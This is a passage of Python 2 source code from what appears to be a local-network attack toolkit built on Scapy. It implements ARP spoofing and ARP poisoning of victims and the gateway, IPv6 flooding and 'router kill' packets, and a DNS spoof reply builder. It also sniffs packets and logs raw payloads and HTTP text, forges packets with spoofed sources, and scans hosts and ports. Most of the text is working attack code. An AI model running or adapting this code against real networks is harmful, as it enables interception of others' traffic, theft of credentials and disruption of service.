								ips.append(buff[i][0])
								macs.append(buff[i][1])
						if config.rawscan['rawscan'] == True:
							config.comfm.append('m3', 'm3fast',ips, macs)
							config.comfm.append('m3', 'm3scan')
						if config.rawscan['rawpool'] != -1:
							config['ipmacpool'][self.rawpool].append(buff)
						if config.rawscan['rawlanhack'] == True: config.comfm.append('m2', "m2new", ips)
						if config.rawscan['rawarp'] == True: config.comfm.append('sc', "scnew", ips, macs)
						if config.rawscan['rawpoison'] == True: config.comfm.append('sc', "scarppoison")				
				config.ipmacbuff = config.ipmacbuff[len(buff):]
		#toremove
		elif len(config.noans)>0:
			buff = config.noans[:]
			if buff != []:
				toclient = '{x}'
				for i in range(len(buff)):
					ipmac = config.ipmac.pop(findindex(buff[i],config.ipmac))
					toclient += buff[i]+'|'
					print colours.lightred+ipmac[0]+' | '+ipmac[1]+colours.default
				if toclient != '{x}': client.send(toclient)
				config.noans = config.noans[len(buff):]
		#ip6
		elif len(config.ip6macbuff)>0:
			if config.ip6macbuff != []:
				buff = list(config.ip6macbuff)
				if buff != []:
					toclient = '{n}'
					for i in range(len(buff)):
							buff[i].insert(0,'')
							if len(buff[i])==2:
								buff[i].insert(1,'00:10:f3:32:c1:5d')
							buff[i].insert(2,config.reclock(buff[i][2],buff[i][1]))
							temp = buff[i][3]
							buff[i][3] = buff[i][1]
							buff[i][1] = temp
							if config.insert_ipmac(buff[i],'IPv6') == True:
								toclient += buff[i][0]+'|'+buff[i][1]+'|'+str(round(buff[i][2],3))+'|'+buff[i][3]+'|'
							if bmeterp: print '\r' + buff[i][0] + ' | ' + buff[i][1] + '\t'
					if toclient != '{n}': client.send(toclient)
					config.ip6macbuff = config.ip6macbuff[len(buff):]

class multiprocess_core3():
	def __init__(self,pos, name, com, client):
		self.name = name
		self.pos = pos
		self.events = []
		self.subservices = []
		self.communicate = com	
		self.mode = []
		self.scanning = False
		self.client = client
	def run(self):
		[self.subservices.remove(s) for s in self.subservices if not s.isAlive() and self.scanning == True]
		self.answer(self.communicate.listen())
		self.answer([self.client.run()])
	def stop(self):
		if config.noise == 'talk': print("Process3 stopped")
	def answer(self,cmd=None):
		if cmd is not None and cmd != ['c']:
			for c in cmd:
				c, param = parse_params(c)
				if c == 'm3new':
					if param != []:
						t = subservice(param[0],param[1],client=self.client)
						self.mode.append('normal')
						self.subservices.append(t)
						if config.noise=='talk':print(param[0])
				elif c == 'm3fast':
					if param != []:
						t = subservice(param[0],param[1],'fast',client=self.client)
						self.mode.append('fast')
						self.subservices.append(t)
						if config.noise=='talk':print(param[0])
				elif c == 'm3scan':
					scanning = True
					for s in self.subservices:
						s.start()
		

#GROUP ATTACK	
class service_core():
   	def __init__(self,pos, name, com, client):
		self.client = client
		self.pos = pos
		self.subservices=[]
		self.initiated=time.ctime(time.time())
		self.events = []
		self.communicate = com
		self.name = name
		self.addrpool = []
		self.hrwdpool = []
		self.localip = config.netspecs.get_lan_ip()
		self.localmac = config.netspecs.get_mac()
		self.dgwip = config.netspecs.get_gateway()
		self.dgwmac = config.netspecs.get_gateway_mac()
		self.mim = False
		self.arpspoof = False
		self.arpthread = []
		self.poisonthread = []
	def run(self):
		self.answer(self.communicate.listen())
		self.answer([self.client.run()])
		if self.arpspoof == True: self.arp_spoof()
		if self.mim == True: self.man_in_middle()
	def stop(self):
		if config.noise == 'talk': print "ServiceCore shutdown"
	def arp_spoof(self):
		if self.addrpool is not None:
			attIP = self.localip
			attMAC = self.localmac
			dgwIP = self.dgwip
			dgwMAC = self.dgwmac
			arp1 = []
			arp2 = []
			for i in range(len(self.addrpool)):
				vicIP = self.addrpool[i]
				vicMAC = self.hrwdpool[i]
				pkt1 = ARP(op=2, psrc=vicIP,pdst=dgwIP,hwdst=dgwMAC,hwsrc=attMAC)
				pkt2 = ARP(op=2, psrc=dgwIP,pdst=vicIP,hwdst=vicMAC,hwsrc=attMAC)
				arp1.append(ARP(op=2, psrc=vicIP,pdst=dgwIP,hwdst=dgwMAC,hwsrc=attMAC))
				arp2.append(ARP(op=2, psrc=dgwIP,pdst=vicIP,hwdst=vicMAC,hwsrc=attMAC))
			#create one threads by 20 packets to send
			nb = int(len(arp1)/10) + 1
			for i in range(nb):
				i=0
				pkts = []
				while arp1 != None and len(arp1)>0 and i<10:
					pkts.append(arp1.pop(0))
					pkts.append(arp2.pop(0))
					i+=1
				t = packetsender(pkts)
				self.arpthread.append(t)
				t.start()
			[t.join() for t in self.arpthread]
			self.arpthread = []
	def arp_poison(self):
		if config.noise != 'silent': print("starting arppoison")
		#cleanup
		if self.poisonthread != None:
			temp = []
			for i in range(len(self.poisonthread)):
				if not self.poisonthread[i].isAlive(): temp.append(i)
			[self.poisonthread.pop(i) for i in temp]
		for i in range(len(self.addrpool)): 
			t = threading.Thread(target=ARPpoison, args=(self.addrpool[i],self.hrwdpool[i],))
			self.poisonthread.append(t)
			t.start()
		if config.noise != 'silent': print("arppoison done")
	def man_in_middle(self):
		return
	def answer(self,cmd=None):
		if cmd is not None and cmd != ["c"]:
			for c in cmd:
				c, param = parse_params(c)
				if c == 'scnew': 
					self.addrpool.append(param[0])
					self.hrwdpool.append(param[1])
				elif c == 'scremove':
					self.addrpool.remove(self.addrpool[self.addrpool.index(param[0])])
					self.hrwdpool.remove(self.addrpool[self.addrpool.index(param[0])])
				elif c == 'scarpspoof': self.arpspoof = True
				elif c == 'scarpspoofclr':
					self.addrpool = []
					self.hrdwpool = []
				elif c == 'scarpspoofrmv':self.arpspoof = False
				elif c == 'scarppoison':self.arp_poison()
				elif c == 'scmim': self.mim = True

class packetsender(threading.Thread):
	def __init__(self, packets):
		threading.Thread.__init__(self)
		self.packets = packets
	def run(self):
		for p in self.packets: send(p)

class ipv6_core():
   	def __init__(self,pos, name, com, client):
		self.pos = pos
		self.initiated=time.ctime(time.time())
		self.name = name
		self.events = []
		self.subthreads = []
		self.communicate = com
		self.killing = False	
		self.client = client
	def run(self):
		self.answer(self.communicate.listen())
		self.answer([self.client.run()])
	def stop(self):
		if self.events != None: [e.set() for e in self.events]
		if config.noise == 'talk': print "IPv6Core shutdown"
	def answer(self,cmd=None):
		if cmd is not None and cmd != ['c']:
			for c in cmd:
				c, param = parse_params(c)
				if c == 'i6flood':
					if config.noise != 'silent': print("sending ipv6 problematic packets")
					pktm.spool(pktm.ipv6_multi_cast(), 10)
					pktm.spool(pktm.ipv6_icmp(),10)
					pktm.spool(pktm.ipv6_routerkill(),10)
					pktm.spool(pktm.ipv6_nav1(),30) 
					pktm.spool(pktm.ipv6_nav2(),30)
					pktm.spool(pktm.ipv6_hophop(),1)
					pktm.spool(pktm.ipv6_jumbo(),20)
				elif c == 'i6kill':
					if self.killing == False:
						if config.noise != 'silent': print("killing the router transmission")
						e = threading.Event()
						t = threading.Thread(target=ipv6_dhcp_sollicit, args=(e,))
						self.subthreads.append(t)
						self.events.append(e)
						t.start()
						self.killing = True
				elif c == 'i6stopkill': 
					[e.set() for e in self.events]
					if config.noise != 'silent': print("stopped killing the router transmission")
					self.events = []
					self.subthreads = []
					self.killing = False
		cmd = None

#SYSTEM CHECKER
class sniff_core():
	def __init__(self,pos, name, com, client):
		self.pos = pos
		self.communicate = com	
		self.name = name
		self.dspoof = False
		self.client = client
	def run(self):
		self.answer(self.communicate.listen())
		self.answer([self.client.run()])
		if self.dspoof == True:
			a=sniff(filter="port 53", count=1, promisc=1, store=0)
			#if not a[0].haslayer(DNS) or a[0].qr: continue
			#send(self.mkspoof(a[0]))
	def stop(self):
		if config.noise == 'talk': print("Sniff Core shutdown")
	def mkspoof(self,x):
		ip=x.getlayer(IP)
		dns=x.getlayer(DNS)
		return IP(dst=ip.src,src=ip.dst)/UDP(dport=ip.sport,sport=ip.dport)/DNS(id=dns.id,qd=dns.qd,an=DNSRR(rrname=dns.qd.qname, ttl=10, rdata="1.2.3.4"))
	def answer(self,cmd=None):
		if cmd is not None and cmd != ['c']:
			for c in cmd:
				c, param = parse_params(c)
				if c == 'fcdnsspoof': self.dspoof = True
				elif c == 'fcdnsspoofstop': self.dspoof = False
		cmd = None

#SNIFF DATABASE
class sniff_sentry():
	def __init__(self,pos, name, com, client):
		self.pos = pos
		self.communicate = com
		self.name = name
		self.sniffkeeper = []
		self.filter = ''
		self.count = 1
		self.MAXCOUNT = 220000
		self.i = 0
		self.view = False
		#client side
		self.sock = None
		# connect to remote host
		self.socket_list = []
		self.monitorarp = False
		self.ipbuff = []
		self.ip6buff = []
		self.threads = []
		self.clock = None
		self.events = []
		self.sniffsummary = []
		self.list = []
		self.client = client
		#start the server tunel
		self.server = None
		global tunel
		tunel.create('tunel2')
		self.server = tunel.get_server('tunel2')
		e = threading.Event()
		self.events.append(e)
		t = threading.Thread(target=sniff_tunel, args=(e,self.server,))
		self.timed = None
		t.start()
		self.tmr = time.time()
	def run(self): 
		if time.time() - self.tmr > 0.5:
			self.tmr = time.time()
			self.answer([self.client.run()])
			self.answer(self.communicate.listen())
		self.preprocess_pks()
		self.process_pks()
	def stop(self):
		[e.set() for e in self.events]
		self.server.stop()
		if self.timed != None: self.timed.cancel()
		sendp(Ether()/IP()/"Close Tunel")
		time.sleep(0.06)
		sendp(Ether()/IP()/"Close Tunel")
		if self.clock != None: self.clock.cancel()
		if config.noise == 'talk': print("Sniff Sentry shutdown")
	def preprocess_pks(self):
		[self.threads.remove(t) for t in self.threads if not t.isAlive()]
		if len(config.snfrawpks) > 0 and len(self.threads) < 42:
			t = threading.Thread(target=transform_pks)
			self.threads.append(t)
			t.start()
	def process_pks(self):
		pks = config.snfpks
		if pks != None and pks != [] and pks != '':
			for pkt in pks:
				self.keepit(pkt)
				if self.i >= self.MAXCOUNT:
					self.save()
			config.snfpks = config.snfpks[len(pks):]
	def answer(self,cmd=None):
		global config
		if cmd != None and cmd != ['c']:
			for c in cmd:
				c, param = parse_params(c)
				if c == 'ssfilter':
					if param != []:
						self.filter = param[0].replace('|', ' ')
						if config.noise != 'silent': print("new filter: "+self.filter)
				elif c == 'enter':self.view = False
				elif c == 'ssflist':
					if param != []:
						if param[0] == 'add':
							macs = param[1].split('|')
							for p in macs:
								if p not in self.list:
									self.list.append(p)
							print("added "+str(len(macs))+" macs to filter list")
						elif param[0] == 'clear':
							print(colours.lightred + "cleared filter list" + colours.default)
							self.list = []
				elif c == 'ssnumber':
					if param != [] and param[0].isdigit() and param[0] > 0:
						self.count = int(param[0])
						if config.noise != 'silent': print("sniff saving raw "+param[0]+" packets")
				elif c == 'ssmaxautosave': 
					if param != []:						
						self.MAXCOUNT = int(param[0])
					if config.noise != 'silent': print "autosave max capture",param[0],"packets" 
				elif c == 'ssview':
					config.toread = ''
					if self.view == False: 
						if config.noise != 'silent': print("packets view activated")
						self.view = True
				#elif c == 'ssselect':
					#if param != [] and param[0].isdigit() and \
					#int(param[0]) > 0 and len(param)==2 and\
					#param[1].isdigit() and int(param[1])>0 and\
					#int(param[1])<len(self.sniffkeeper):
						#send chosen packet in hexadecimal form
						#self.client('{k}'+str(param[0])+'|'+\
						#export_packet(self.sniffkeeper[int(param[1])]))
				elif c == 'ssarpmonitor':
					if param != []: 
						if param[0]=='stop': self.arpmonitor(False)
						elif param[0]=='start' and self.monitorarp == False: 
							self.arpmonitor(True)
				elif c == 'sssummary':
					if param != []:
						if len(param) > 1 and param[0].isdigit() and param[1].isdigit():
							for i in range(int(param[0]), int(param[1])):
								print self.sniffsummary[i]
						elif param[0] == '*':
							for i in range(len(self.sniffsummary)):
								print self.sniffsummary[i]
						elif param[0] == '**':
							e = threading.Event()
							self.events.append(e)
							t = threading.Thread(target=showpacket, args=(self.sniffkeeper, e, ))
							t.start()
						elif param[0] == '***':
							txt = ''
							for i in range(len(self.sniffkeeper)):
								sys.stdout.flush()
								pkt = self.sniffkeeper[i]
								if pkt.haslayer(Raw) and pkt.getlayer(Raw).load!="":
									try:
										txt = convert.hex2word(str(pkt.getlayer(Raw).load).encode("hex"))
										print(str(i)+') '+txt)
									except Exception,e: 
										print str(e)
										pass
						elif param[0].isdigit():
							p = int(param[0]) 
							if p>len(self.sniffsummary):
								p = len(self.sniffsummary)
							for i in range(len(self.sniffsummary)-p, len(self.sniffsummary)):
								pkt = self.sniffsummary[i]
								print pkt
				elif c == 'ssshow':
					if param != [] and param[0].isdigit() and int(param[0])<len(self.sniffkeeper):
						self.sniffkeeper[int(param[0])].show()
				elif c == 'sscount': 
					print str(self.i)
				elif c == 'sssave': 
					self.save()
				elif c == 'sssummary':
					print '### sniff summary ###'	
			cmd = None
	def colorify(self, pkt):
		global config
		pkts = pkt
		packet = ''
		color=colours.default
		if pkts.src==config.netspecs.get_mac() or pkts.dst==config.netspecs.get_mac():
			color=colours.blue
		elif pkts.src==SPOOFMAC or pkts.dst==SPOOFMAC:
			color=colours.darkgrey
		elif pkts.src in [p for p in self.list] or pkts.dst in [p for p in self.list]:
			color=colours.yellow
		elif pkts.src==config.netspecs.get_gateway() or pkts.dst==config.netspecs.get_gateway():
			color = colours.magenta
		if config.hexa == False:
			packet = color+str(len(self.sniffsummary))+') '+pkts.summary()+colours.default
		else: 
			packet = color+str(len(self.sniffsummary))+')'+str(pkts).encode("HEX")+colours.default
		self.sniffsummary.append(packet)
		return packet
	def keepit(self, packet):
		global config
		at = True if self.filter.find('@') == -1 else False
		if ('!mymac' in self.filter and (packet.src != config.mymac and packet.dst != config.mymac and at)) \
		 or self.filter in ('', 'none', '!arp')\
		 or ('@mymac' in self.filter and (packet.src == config.mymac or packet.dst == config.mymac)) or ('@spoofmac' in self.filter \
		 and (packet.src == SPOOFMAC or packet.dst == SPOOFMAC)) or ('!spoofmac' in self.filter and (packet.src != SPOOFMAC\
		 and packet.dst != SPOOFMAC and at)) or ('@gateway' in self.filter and (packet.src == config.netspecs.get_gateway()\
		 or packet.dst == config.netspecs.get_gateway)) or ('@list' in self.filter and (packet.src in [p for p in self.list]\
		 or packet.dst in [p for p in self.list])) or ('!list' in self.filter and (not packet.src in [p for p in self.list]\
		 and not packet.dst in [p for p in self.list] and at)):
			self.sniffkeeper.append(packet)
			colorpkt = self.colorify(packet)
			self.i += 1
			if self.view == True:
				if not ('!arp' in self.filter and packet.haslayer(ARP)):
					print colorpkt
			if self.monitorarp == True:
				ip_type='IPv4'
				ip = [config.localhost]
				mac = [packet.src, packet.dst]
				if packet.haslayer(ARP):
					ip[0] = packet.psrc
					ip.append(packet.pdst) 
				elif packet.haslayer(IP): 
					ip[0] = packet[IP].src
					ip.append(packet[IP].dst)
				elif packet.haslayer(IPv6):
					ip[0] = packet[IPv6].src
					ip.append(packet[IPv6].dst)
					ip_type = 'IPv6'
				for i in range(len(ip)):
					if (not config.myip == ip[i] and (not packet.haslayer(ICMP))) and mac[i] != 'ff:ff:ff:ff:ff:ff':
						if ip_type=='IPv4' and ip[i] not in self.ipbuff:
							self.ipbuff.append(ip[i])
							config.ipmacbuff.append([ip[i],mac[i]])
						elif ip_type=='IPv6' and ip[i] not in self.ip6buff:
							self.ip6buff.append(ip[i])
							config.ip6macbuff.append([ip[i],mac[i]])
	def save(self):
		self.i = 0
		t = threading.Thread( target=save_sniff, args=(self.sniffkeeper, ))
		self.sniffkeeper = []
		t.start()
	def arpmonitor(self,activate=True):
		if activate == True:
			print colours.green+"started monitor"+colours.default
			self.monitorarp = True
			self.sniff = True
			self.timer = threading.Timer(1.0, self.sendipmac)
			self.timer.start()
		else:
			print "stopped arp monitor"
			self.ipmac = []
			self.ipmacbuff = []
			self.sniff = False
			self.monitorarp = False
	def sendipmac(self):
		#IPv4
		imbuff = config.ipmacbuff[:]
		if imbuff != []:
			toclient = '[m2][i4]'
			for i in range(len(imbuff)):
				toclient += imbuff[i][0]+'|'+imbuff[i][1]+'|'
			if toclient != '[m2][i4]': self.client.send(toclient)
			config.ipmacbuff=config.ipmacbuff[len(imbuff):]
		#IPv6
		i6mbuff = config.ip6macbuff[:]
		if i6mbuff != []:
			toclient = '[m2][i6]'
			for i in range(len(i6mbuff)):
				toclient += i6mbuff[i][0]+'|'+i6mbuff[i][1]+'|'
			if toclient != '[m2][i6]': self.client.send(toclient)
			config.ip6macbuff = config.ipmacbuff[len(i6mbuff):]

		self.timer = threading.Timer(1.0, self.sendipmac)
		self.timer.start()

def showpacket(packets,event):
	global config
	config.toread = ''
	clock = 0
	for i in range(len(packets)):
		if config.toread == 'enter' or event.isSet(): break
		pkt = packets[i]
		color=colours.blue if pkt.src==config.mymac else colours.default
		time.sleep(0.05)
		clock += 0.05
		sys.stdout.flush()
		if config.hexa == False:
			print color+str(i)+') '+pkt.summary()+colours.default
		else: 
			print color+str(i)+')'+str(pkt).encode("HEX")+colours.default

def save_sniff(keeper):
	f = open('sniff2.bota', 'a+')
	f.write("-------------------[ " + str(datetime.now()) + " ]--------------------")
	for i in range(len(keeper)):
		f.write(str(i)+') '+keeper[i].summary()+'\n')
		oldstdout = sys.stdout
		capture = StringIO()
		sys.stdout = capture
		keeper[i].show()
		f.write(capture.getvalue())
		capture.flush()
		sys.stdout = oldstdout
		if keeper[i].haslayer(Raw):
			toword = convert.hex2word(str(keeper[i].getlayer(Raw).load).encode("hex"),False)
			if 'http' in toword.lower():
				f.write(toword)
			else:
				f.write(str(keeper[i].getlayer(Raw).load).encode("hex"))
	if config.noise != 'silent': print("sniff saved on \'sniff2.bota\'")

def sniff_tunel(event,server):
	process = subprocess.Popen("./sniffer 42.l3e7 "+str(server.get_port())+" "+config.localhost+" "+ config.netspecs.get_iface(), shell=True)
	threads = []
	while(not event.isSet()):
		msg = server.run()
		if msg != None and len(msg)>3 and msg[0:3]=='{^}':
				pks = msg.replace("{^}","").split(';')
				pks = pks[:len(pks)-1]
				for pkt in pks:
					config.snfrawpks.append(pkt)
				
def transform_pks():
	rawpks = config.snfrawpks[:]
	config.snfrawpks = config.snfrawpks[len(rawpks):]
	for pkt in rawpks: config.snfpks.append(Ether(pkt.decode("hex")))

#PACKET MANIPULATION
class packet_core():
	def __init__(self,pos, name, com, client):
		self.pos = pos
		self.name = name
		self.communicate = com
		self.bconfig = False
		self.nbpacket = 0
		#self.pkttest = Ether(src=SPOOFMAC,dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=config.netspecs.get_gateway())
		#self.pkttest = Ether(src=SPOOFMAC)/IP(src=SPOOFIP)
		self.pkttest = Ether(src=SPOOFMAC)/IP(src=SPOOFIP,dst=config.netspecs.get_gateway(),id=1111,ttl=99)/TCP(sport=RandShort(),dport=[22,80],seq=12,ack=1000,window=1000,flags='S',options=[('Timestamp', (10,0))])
		self.pktsize = 0
		self.pktrate = []
		self.sniff = None
		self.e = None
		self.sleep = 0.1
		self.tstart = 0
		self.gotit = False
		self.t = 0
		self.bounce = 0
		self.loadsize = 0
		self.client = client
	def run(self):
		global config
		self.answer(self.communicate.listen())
		self.answer([self.client.run()])
		if self.bconfig == True:
			if config.toread == 'enter':
				self.bconfig = False
				self.e.set()
				self.t = 0
				self.gotit = False
				self.sleep = 0.1
				self.pktrate = []
				self.bounce = 0
				self.nbpacket = 0
				config.nbpacket = 0
			else:
				time.sleep(self.sleep)
				self.nbpacket += 1
				pktrcp = round(float(1/self.sleep),1)
				pktsize = float(self.pktsize * pktrcp) / 1000
				towrite = "\r%s pkt/sec | %s ko/sec" % (pktrcp, pktsize)
				sys.stdout.write(colours.on_blue + towrite + colours.default)
				sys.stdout.flush()
				if time.time() - self.tstart > 1:
					try:
						sendp(self.pkttest, count=self.nbpacket)
					except: pass
					time.sleep(3)
					med = round(float(config.nbpacket) / float(self.nbpacket) * 100,1)
					towrite = "\r%s%% avg/rate | %s pkt/sec | %s ko/sec" % (med, pktrcp, pktsize)
					sys.stdout.write(colours.on_blue + towrite + colours.default)
					sys.stdout.flush()
					if med > 90:
						self.sleep -= ( self.sleep * ( 0.1 ) * (0.97 ** (self.t - 1)))
					else:
						if med < 90:
							time.sleep(3)
							self.gotit = True
							self.sleep += ( self.sleep * ( 0.1 ) * (0.97 ** (self.t - 1)))
					print ""
					config.nbpacket = 0
					self.nbpacket = 0
					self.tstart = time.time()
	def stop(self):
		if self.e !=None: self.e.set()
		if config.noise == 'talk': print("Packet Core shutdown")
	def answer(self,cmd=None):
		global config
		if cmd is not None and cmd != ['c']:
			for c in cmd:
				c, param = parse_params(c)
				if c == 'pcconfig':self.config(param[0])
				elif c == 'pcsend':self.send()
	def send(self):
		global packets
		if packets != None and len(packets) > 0:
			if param != []:
				if param[0] == 'view':
					for i in range(len(packets)): print(packets[i][0]+'-'+import_object(packets[i][1]).summary())
				elif param[0] == 'clear': packets = []
			else: #send the packets
				for i in range(len(packets)):
					t = threading.Thread(target=Thread_p, args=(int(packets[i][0]),packets[i][1],))
					t.start()
				packets = []
	def config(self,size):
		global config
		config.toread = ''
		self.pkttest = Ether(src=SPOOFMAC)/IP(src=SPOOFIP,dst=config.netspecs.get_gateway())
		self.nbpacket = 0
		config.nbpacket = 0
		self.bconfig = True
		self.loadsize = int(size)
		self.pkttest = self.pkttest /("X"*self.loadsize)
		self.pktsize = len(str(self.pkttest).encode("hex"))/2
		self.e = threading.Event()
		self.sniff = threading.Thread(target=sniffpkt,args=(self.event,))
		self.sniff.start()
		self.tstart = time.time()
		
def sniffpkt(e):
	global config
	while not e.isSet():
		a=sniff(timeout=3,store=1000)
		for p in a:
			if p.haslayer(Ether) and p.src == SPOOFMAC:
				config.nbpacket += 1

########################[ ARPSCANNER ]#########################

class arpscanner(threading.Thread):
	def __init__(self, modes=None,verify_ipmac=None,suspendip=None):
		threading.Thread.__init__(self)
		self.name = "arpscanner"
		self.host=config.localhost
		self.port=config.port
		self.mode=0
		self.mask=config.netspecs.get_mask_range()
		self.gateway=config.netspecs.get_gateway()
		self.ips=[]
		self.macs=[]
		self.searchmask = '/24'
		self.nbhost = 256
		self.nbthreads = 1
		self.waittime = 1
		self.verify = False
		self.type = "arp"
		self.local = True
		self.ether = False
		self.x=0
		self.y=0
		if modes != None and modes != '': 
			self.modes = modes.split('|')
			for mod in self.modes:
				if mod.isdigit(): self.nbthreads = int(mod)
				elif mod[0:1] == '/':
					if mod[1:] == 'x00':
						self.searchmask = ''
						self.nbhost = 1
					else:
						self.searchmask = mod
						self.nbhost = config.netspecs.get_nb_hosts_mask(mod)
				elif mod[-1:] == 's': self.waittime = int(mod[:-1])	
				elif mod[0:1] == '*': self.nbpkt = int(mod[1:])
				elif mod[0:2] == '-e': self.ether = True
			for mod in self.modes:
				if re.match(r'^([0-9]{1,3}[*]?.){3}[0-9]{1,3}(/[0-9]{1,2})?$', mod): 
					if mod.find('*') != -1:
						occ = countoccu(mod[:mod.find('*')+2],'.')
						ext = mod[:mod.find('*')]
						ext2 = mod[mod.find('*')+1:]
						net = ext + ext2
						if occ == 1:
							indx = int(net[:net.find('.')])
							ext = net[net.find('.'):]
							for i in range(indx, 255):
								ip = IPNetwork(str(i)+ext)	
								self.ips += ip
						elif occ == 2:
							indx = int(net[net.find('.')+1:findindx(net,'.',2)+2])
							ext1 = net[:net.find('.')+1]
							ext2 = net[findindx(net,'.',2)+2:]
							for i in range(indx, 255):
								ip = IPNetwork(ext1+str(i)+ext2)
								self.ips += ip
					else: self.ips = IPNetwork(mod)
					self.local = False
					if mod.find("/") != -1: 
						self.mask = mod[mod.find("/"):]
					else:
						self.nbhost = 1
						self.searchmask = ""
						self.mask = ""
				elif mod in ("icmp","tcp","udp"): self.type = mod
		else: self.modes = None
		if self.searchmask != "" and int(self.mask[1:]) > int(self.searchmask[1:]):
			self.searchmask = self.mask
			self.nbhost = config.netspecs.get_nb_hosts_mask(self.mask)
		if verify_ipmac == None and self.ips == []:
			self.ips = IPNetwork(config.netspecs.get_network() + config.netspecs.get_mask_range())
		elif verify_ipmac == True: 
			self.verify = True
			for i in range(len(verify_ipmac)):
				self.ips.append(verify_ipmac[i][0])
			self.searchmask = ''
			self.nbhost = 1
			if len(verify_ipmac) >= 30: self.nbthreads = 30
			elif verify_ipmac in range(1,30): self.nbthreads = len(verify_ipmac)
			#cut ips to fit the searched ip to the end
		if suspendip != None and IPAddress(suspendip) in IPNetwork(config.netspecs.get_network()+config.netspecs.get_mask_range()):
			if IPAddress(suspendip) in self.ips: 
				self.x = find2dindex(suspendip,self.ips)
	def arping(self):
		threads = []
		threads2 = []
		global mesuring
		self.ips = [ip for ip in self.ips]
		i = 1
		y = 1
		for ip in range(1, len(self.ips)+1, self.nbhost):
			if (not findchar2d('%', self.modes) or (findchar2d('%', self.modes) and find2dStrByChar('%',self.modes) != None and\
			 float(round(float(i)/len(self.ips)*100, 5)) > round(float(find2dStrByChar('%',self.modes)[:-1]),5))):
				if (((i-1) % self.nbhost) == 0) or (i-1) == 0 :
					tpkt = self.pktsend(self.ips[i-1])
					threads.append(tpkt)	
					tpkt.start()
					mesuring = i-1+self.nbhost
					y+=1
				while len(threads) >= self.nbthreads:
					threads = self.killthreads(threads)
					time.sleep(config.sleep)
					if os.path.isfile('eap.bota'): 
						for t in threads:
							if not t.isAlive(): threads.remove(t)
							if t.isAlive(): 
								t.join()
								threads.remove(t)
								return 0			
						threads = []
			i+=self.nbhost
		[t.join() for t in threads if t.isAlive()]
	def killthreads(self, threads):
		for a in threads:
			if not a.isAlive():
				threads.remove(a)
		return threads
	def pktsend(self, ip):
		pkt = None
		t = None
		if self.type=="arp": pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=str(ip)+self.searchmask)
		elif self.type=="icmp": pkt = IP(dst=str(ip)+self.searchmask, ttl=64, id=RandShort())/ICMP(type=8)
		elif self.type=="tcp": pkt = IP(dst=str(ip)+self.searchmask)/TCP(dport=80,flags="S",options=[('Timestamp',(0,0))])
		elif self.type=="udp": pkt = IP(dst=str(ip)+self.searchmask)/UDP(dport=0)
		if self.ether and not pkt.haslayer(Ether): pkt = Ether()/pkt
		t = threading.Thread(target=arpco_8_16, args=(pkt,self.nbthreads,self.waittime,self.verify,self.type,self.local))
		self.y+=1
		return t
	def run(self):	
		if self.mode == 0:
			self.arping()
			writeToCyborg('arping.stop -i')
			with open("eap.bota",'w') as eap: eap.write('')
			print(colours.lightred+"arpscanner shutdown"+colours.default)

def arpco_8_16(pkt,threads,tout,isthere,type="arp",local=True):
	global config
	ipmac=[]
	try:
		if pkt.haslayer(Ether): ans,unans=srp(pkt,timeout=tout,inter=(.00001*threads))
		else: ans,unans=sr(pkt,timeout=tout,inter=(.00001*threads))	
	except: 
		pass
	try:
		for snd,rcv in ans:
			if os.path.isfile('eap.bota'): return
			if type=="arp": config.ipmacbuff.append([rcv.psrc, rcv.src])
			elif pkt.haslayer(Ether): config.ipmacbuff.append([rcv[IP].src, rcv.src])
			else: config.ipmacbuff.append([snd.dst, "00:00:00:00:00:00"])
		try:
			if isthere == True:
				if ipmac == []:
					if not icmp: ip = pkt[0].pdst
					else: ip = pkt[0].dst
					config.noans.append(ip)
		except: pass
	except: pass
	return
	
########################[ SUBPROCESSORS ]#########################
#SUB SERVICE
class subservice(threading.Thread):
	func = []
	def __init__(self,ip ,mac ,mode=None ,name="subservice",client=None):
		threading.Thread.__init__(self)
		self.name = name
		self.stop = False
		self.ip = ip
		self.mac = mac
		self.client = client
		self.mode = mode
	def run(self):
		if config.noise == 'talk': print self.name, "running...", self.ip 
		self.begin()
		if config.noise == 'talk': print 'Subservice conneced'
		ports = self.scan(self.mode)
		self.client.send(ports)
	def scan(self,mode=None):
		toret = '{p}'+self.ip
		sta = scscantcp_ack(self.ip,self.mac,self.mode)
		sts = scscantcp_syn(self.ip,self.mac,self.mode)
		su = scscanudp(self.ip,self.mac,self.mode)
		sfw = scscantcp_fw(self.ip,self.mac,self.mode)
		if sts is not None: 
			syn = '{'+str(SN)+'}'+'|'.join("{0}".format(n) for n in sts)
			toret +=  syn 
		if sta is not None:
			ack = '{'+str(AK)+'}'+'|'.join("{0}".format(n) for n in sta) 
			toret += ack
		if su is not None: 
			udp = '{'+str(UP)+'}'+'|'.join("{0}".format(n) for n in su)
			toret += udp
		if sfw is not None: 
			fw = '{'+str(FW)+'}'+'|'.join("{0}".format(n) for n in sfw)
			toret += fw
		return toret

#SCAN UDP	
def scscanudp(ip,mac,mode=None):
	if config.noise == 'talk': print "udp scan (1, 1023)"
	ports=[]
	dp = [53,54,67,68,69,123,161,162,264,514,520,546,1194,2106,2164,5353]
	ans = None
	unans = None
	srcPort = random.randint(1025,65534)
	build = Ether(dst=mac)/IP(dst=ip)
	if mode == 'fast': 
		ans,unans = srp(build/UDP(dport=dp,sport=srcPort),timeout=1)
	elif mode == None : ans,unans = srp(build/UDP(dport=(1,1024),sport=srcPort),timeout=1)
	for s,r in ans:
		ports.append(r.sport)
		if config.noise == 'talk': print 'port opened on '+ ip +" port: "+ str(r.sport)
	ports = unique1d(ports)
	return ports 

#SCAN TCP SYN
def scscantcp_syn(ip,mac,mode=None):
	if config.noise == 'talk': print "tcp scan syn(1, 1023)"
	ports=[]
	dp = [20,21,22,23,53,80,137,138,139,443,449,548,1023,3306,8080]
	ans = None
	unans = None
	srcPort = random.randint(1025,65534)
	build = Ether(dst=mac)/IP(dst=ip)
	if mode == 'fast': ans,unans = srp(build/TCP(dport=dp,sport=srcPort),timeout=1)
	elif mode == None : ans,unans = srp(build/TCP(dport=(1,1024),sport=srcPort),timeout=1)
	for s,r in ans:
		ports.append(r.sport)
		if config.noise == 'talk': 
			print 'port opened on '+ ip +" port: "+ str(r.sport) + " flag: " + str(r.flags)
			print 'trying to hanshake connection'
		#try to handshake connection
		pktm.tcp_handshake(ip, r.sport)
	ports = unique1d(ports)
	return ports 

#SCAN TCP ACK
def scscantcp_ack(ip,mac,mode=None):
	if config.noise == 'talk': print "tcp scan ack(1, 1023)"
	ports=[]
	dp = [20,21,22,23,53,80,137,138,139,443,449,548,1023,3306,8080]
